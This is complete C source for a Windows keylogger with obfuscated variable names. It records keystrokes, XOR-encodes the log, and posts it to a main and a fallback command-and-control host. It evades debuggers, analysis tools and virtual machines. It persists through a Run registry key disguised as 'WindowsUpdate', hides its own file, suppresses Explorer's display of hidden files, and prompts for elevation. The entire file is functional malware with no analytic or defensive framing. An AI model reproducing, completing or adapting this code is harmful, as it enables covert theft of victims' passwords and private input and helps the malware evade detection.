#include <stdio.h>
#include <windows.h>
#include <wininet.h>
#include <psapi.h>
#include <stdlib.h>
#include <time.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <tchar.h>

#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "Shlwapi.lib")

#define O1 1024
#define O2 2000

char V1[O1];
int V2 = 0;
CRITICAL_SECTION V3;
char* O3 = "example.com"; //main c2
char* O5 = "/c2/data"; // route 
char* O6 = "Content-Type: application/json\r\nUser-Agent: TLD11Browser/10.0";

typedef SHORT (WINAPI *F3)(int);
F3 O4;

void F4(char* V4) {
    srand((unsigned int)time(NULL));
    for (int V5 = 0; V5 < 3; ++V5) {
        V4[V5] = 'A' + (rand() % 26);
    }
    V4[3] = '\0';
}

void F5(char* V6, const char* V7) {
    int V8 = strlen(V6);
    for (int V9 = 0; V9 < V8; ++V9) {
        V6[V9] ^= V7[V9 % 3];
    }
}

BOOL F6() {
    return IsDebuggerPresent();
}

BOOL F7() {
    const char* V10[] = {
        "procexp.exe", "ProcessHacker.exe", "wireshark.exe", "tcpview.exe",
        "ollydbg.exe", "x32dbg.exe", "x64dbg.exe", "idaq.exe", "idaq64.exe",
        "idag.exe", "idag64.exe", "ghidra.exe", "windbg.exe", "cheatengine.exe",
        "autoruns.exe", "handle.exe", "immunitydebugger.exe", "radare2.exe",
        "hiew.exe", "procmon.exe"
    };
    DWORD V11[1024], V12, V13;
    unsigned int V14;

    if (!EnumProcesses(V11, sizeof(V11), &V12))
        return FALSE;

    V13 = V12 / sizeof(DWORD);

    for (V14 = 0; V14 < V13; V14++) {
        if (V11[V14] != 0) {
            TCHAR V15[MAX_PATH] = TEXT("<unknown>");
            HANDLE V16 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, V11[V14]);
            if (V16) {
                HMODULE V17;
                DWORD V18;
                if (EnumProcessModules(V16, &V17, sizeof(V17), &V18)) {
                    GetModuleBaseName(V16, V17, V15, sizeof(V15) / sizeof(TCHAR));
                }
            }
            for (int V19 = 0; V19 < sizeof(V10) / sizeof(V10[0]); V19++) {
                if (strstr(V15, V10[V19]) != NULL) {
                    CloseHandle(V16);
                    printf("stop trying to analyze me plz :3\n");
                    exit(1);
                }
            }
            CloseHandle(V16);
        }
    }
    return FALSE;
}

BOOL F8() {
    CURSORINFO V32 = { sizeof(CURSORINFO) };
    if (GetCursorInfo(&V32)) {
        return V32.flags == 0;
    }
    return FALSE;
}

BOOL F9() {
    int V33[4] = { 0 };
    __cpuid(V33, 0x40000000);
    char V34[13];
    memcpy(V34, &V33[1], 4);
    memcpy(V34 + 4, &V33[2], 4);
    memcpy(V34 + 8, &V33[3], 4);
    V34[12] = '\0';

    if (strcmp(V34, "VMwareVMware") == 0 ||
        strcmp(V34, "KVMKVMKVM") == 0 ||
        strcmp(V34, "VBoxVBoxVBox") == 0) {
        printf("stop trying to analyze me plz :3\n");
        exit(1);
    }

    return FALSE;
}

void F10() {
    HINTERNET V20 = InternetOpen(NULL, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (V20) {
        HINTERNET V21 = InternetConnectA(V20, O3, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!V21) {
            V21 = InternetConnectA(V20, "example2.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0); // fallback c2
            if (!V21) {
                InternetCloseHandle(V20);
                return;
            }
        }

        HINTERNET V22 = HttpOpenRequestA(V21, "POST", O5, NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
        if (V22) {
            char V23[4];
            F4(V23);
            F5(V1, V23);

            char V24[O1 + 128];
            sprintf(V24, "{\"content\":\"%s\",\"key\":\"%s\"}", V1, V23);

            if (HttpSendRequestA(V22, O6, -1, V24, strlen(V24))) {
            }
            InternetCloseHandle(V22);
        }
        InternetCloseHandle(V21);
        InternetCloseHandle(V20);
    }
}

void F1() {
    if (F6() || F7() || F9() || F8()) {
        return;
    }

    F10();

    EnterCriticalSection(&V3);
    V2 = 0;
    V1[0] = '\0';
    LeaveCriticalSection(&V3);
}

DWORD WINAPI F2(LPVOID O7) {
    DWORD V25 = GetTickCount();
    while (1) {
        for (int V26 = 8; V26 <= 255; V26++) {
            if (O4(V26) & 0x0001) {
                V25 = GetTickCount();

                char V27[2] = {0, 0};
                SHORT V28 = GetKeyState(VK_CAPITAL) & 0x0001;
                SHORT V29 = O4(VK_SHIFT) & 0x8000;

                if ((V26 >= 'A' && V26 <= 'Z')) {
                    if (V29 ^ V28) {
                        V27[0] = (char)V26;
                    } else {
                        V27[0] = (char)(V26 + 32);
                    }
                } else if (V26 >= '0' && V26 <= '9') {
                    if (V29) {
                        switch (V26) {
                            case '0': V27[0] = ')'; break;
                            case '1': V27[0] = '!'; break;
                            case '2': V27[0] = '@'; break;
                            case '3': V27[0] = '#'; break;
                            case '4': V27[0] = '$'; break;
                            case '5': V27[0] = '%'; break;
                            case '6': V27[0] = '^'; break;
                            case '7': V27[0] = '&'; break;
                            case '8': V27[0] = '*'; break;
                            case '9': V27[0] = '('; break;
                        }
                    } else {
                        V27[0] = (char)V26;
                    }
                } else {
                    switch (V26) {
                        case VK_SPACE: V27[0] = ' '; break;
                        case VK_RETURN: V27[0] = '\n'; break;
                        case VK_TAB: V27[0] = '\t'; break;
                        case VK_BACK:
                            EnterCriticalSection(&V3);
                            if (V2 > 0) {
                                V2--;
                                V1[V2] = '\0';
                            }
                            LeaveCriticalSection(&V3);
                            continue;
                        case VK_OEM_1: V27[0] = (V29) ? ':' : ';'; break;
                        case VK_OEM_PLUS: V27[0] = (V29) ? '+' : '='; break;
                        case VK_OEM_COMMA: V27[0] = (V29) ? '<' : ','; break;
                        case VK_OEM_MINUS: V27[0] = (V29) ? '_' : '-'; break;
                        case VK_OEM_PERIOD: V27[0] = (V29) ? '>' : '.'; break;
                        case VK_OEM_2: V27[0] = (V29) ? '?' : '/'; break;
                        case VK_OEM_3: V27[0] = (V29) ? '~' : '`'; break;
                        case VK_OEM_4: V27[0] = (V29) ? '{' : '['; break;
                        case VK_OEM_5: V27[0] = (V29) ? '|' : '\\'; break;
                        case VK_OEM_6: V27[0] = (V29) ? '}' : ']'; break;
                        case VK_OEM_7: V27[0] = (V29) ? '"' : '\''; break;
                        default: continue;
                    }
                }

                EnterCriticalSection(&V3);
                if (V2 + 1 < O1) {
                    strcat(V1, V27);
                    V2++;
                }
                LeaveCriticalSection(&V3);
            }
        }

        if (GetTickCount() - V25 >= O2) {
            if (V2 > 0) {
                F1();
            }
            V25 = GetTickCount();
        }

        Sleep(10);
    }
    return 0;
}

void F11(const char* V35) {
    HKEY V36;
    LONG V37 = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &V36);
    if (V37 == ERROR_SUCCESS) {
        V37 = RegSetValueEx(V36, "WindowsUpdate", 0, REG_SZ, (BYTE*)V35, strlen(V35) + 1);
        RegCloseKey(V36);
    }
}

void F12(const char* V38) {
    SetFileAttributes(V38, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
}

void F13() {
    HKEY V39;
    LONG V40 = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", 0, KEY_SET_VALUE, &V39);
    if (V40 == ERROR_SUCCESS) {
        DWORD V41 = 0;
        RegSetValueEx(V39, "Hidden", 0, REG_DWORD, (BYTE*)&V41, sizeof(V41));
        RegSetValueEx(V39, "ShowSuperHidden", 0, REG_DWORD, (BYTE*)&V41, sizeof(V41));
        RegCloseKey(V39);
    }
}

void F14() {
    BOOL V42 = FALSE;
    HANDLE V43 = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &V43)) {
        TOKEN_ELEVATION V44;
        DWORD V45 = sizeof(TOKEN_ELEVATION);

        if (GetTokenInformation(V43, TokenElevation, &V44, sizeof(V44), &V45)) {
            V42 = V44.TokenIsElevated;
        }
        CloseHandle(V43);
    }

    if (!V42) {
        TCHAR V46[MAX_PATH];
        if (GetModuleFileName(NULL, V46, MAX_PATH)) {
            SHELLEXECUTEINFO V47 = { sizeof(V47) };
            V47.lpVerb = TEXT("runas");
            V47.lpFile = V46;
            V47.hwnd = NULL;
            V47.nShow = SW_NORMAL;

            if (!ShellExecuteEx(&V47)) {
                exit(1);
            } else {
                exit(0);
            }
        }
    }
}

int wmain() {
    F14();

    TCHAR V48[MAX_PATH];
    GetModuleFileName(NULL, V48, MAX_PATH);

    F11(V48);

    F13();

    F12(V48);

    DWORD V30;
    HANDLE V31;

    O4 = (F3)GetProcAddress(GetModuleHandle(TEXT("user32.dll")), "GetAsyncKeyState");

    InitializeCriticalSection(&V3);
    V31 = CreateThread(NULL, 0, F2, NULL, 0, &V30);
    WaitForSingleObject(V31, INFINITE);
    DeleteCriticalSection(&V3);
    CloseHandle(V31);
    return 0;
}
